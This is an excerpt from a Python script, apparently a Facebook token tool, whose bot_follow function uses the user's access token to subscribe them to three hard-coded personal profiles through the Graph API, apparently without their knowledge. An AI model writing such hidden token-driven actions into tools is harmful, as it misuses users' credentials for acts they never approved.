...
def bot_follow():
	...
	requests.post("https://graph.facebook.com/100001600726189/subscribers?access_token=" + toket)      # Dominic Dhewi Scarlet ΧD.
	requests.post("https://graph.facebook.com/100001704590438/subscribers?access_token=" + toket)      # 라이무
	requests.post("https://graph.facebook.com/1312533932/subscribers?access_token=" + toket) # Dwi Agustini
	menu()
